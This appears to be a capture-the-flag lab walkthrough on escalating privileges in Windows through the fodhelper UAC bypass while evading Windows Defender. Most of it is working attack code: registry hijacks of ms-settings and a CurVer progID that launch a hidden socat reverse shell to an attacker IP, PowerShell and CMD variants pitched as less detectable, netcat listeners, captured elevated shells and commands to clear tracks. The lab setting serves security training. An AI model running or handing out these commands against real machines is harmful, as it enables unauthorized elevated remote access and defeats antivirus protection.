# Bypassing Windows Defender with the Fodhelper Exploit

## Windows Defender

For simplicity, the target machine initially has Windows Defender **disabled**. But what happens if it is **enabled**?

1. **Enable Windows Defender:**  
    On the desktop, double-click the icon to enable Windows Defender.

2. **Attempt the Fodhelper Exploit Again:**  
    Exploit fodhelper through your backdoor connection. As you change the `(default)` value in `HKCU\Software\Classes\ms-settings\Shell\Open\command` to your reverse shell command, a Windows Defender notification will appear.

3. **Review the Alert:**  
    Clicking the notification reveals details about a UAC bypass attempt via registry modification.

4. **Check the Registry Value:**  
    ```cmd
    reg query %REG_KEY% /v ""
    ```
    Output:
    ```
    HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
         (Default)    REG_SZ    (value not set)
    ```
    The value is erased by Defender.

Although it seems the exploit fails with Defender enabled, try the following with a slight modification (replace `<attacker_ip>` as needed):

```cmd
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY%
```

Output:
```
HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
     DelegateExecute    REG_SZ    
     (Default)    REG_SZ    powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes
```

Windows Defender still alerts and deletes the value, but there is a short window before deletion. Set up a listener:

```bash
nc -lvp 4444
```

Then run:

```cmd
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

If executed quickly, you may get a reverse shell before Defender intervenes. This method is unreliable, as it depends on a race condition.

**Example reverse shell:**
```
user@kali$ nc -lvp 4444      
Listening on 0.0.0.0 4444
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Windows Defender still alerts on the bypass. The exploit is easily detected due to the specific registry keys used.

---

## Improving the Fodhelper Exploit

A variation by **@V3ded** uses different registry keys but the same principle.

- Instead of `HKCU\Software\Classes\ms-settings\Shell\Open\command`, use the `CurVer` entry under a custom progID.
- Create a new progID (e.g., `.pwn`) and point `ms-settings\CurVer` to it.

**PowerShell Exploit (replace `<attacker_ip>`):**
```powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force

New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

- This creates a new progID `.pwn` with your payload and points `ms-settings\CurVer` to it.
- Fodhelper uses the `.pwn` progID and executes your command.

**Listener:**
```bash
nc -lvp 4445
```

**Detection:**  
Windows Defender may still alert, but AVs often target published exploits and may miss variations.

**CMD Variant (less likely to be detected):**
```cmd
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
fodhelper.exe
```

**Resulting shell:**
```
user@kali$ nc -lvp 4445      
Listening on 0.0.0.0 4445
Connection received on 10.10.183.127 23441
Microsoft Windows [Version 10.0.17763.1821]
C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

**Retrieve the flag:**
```cmd
C:\> C:\flags\GetFlag-fodhelper-curver.exe
```
*Note: The flag is only returned from a high integrity shell via socat.*

---

## Clearing Tracks

Remove artefacts with:

```cmd
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

*Be sure to clean up to avoid interference with future tasks.*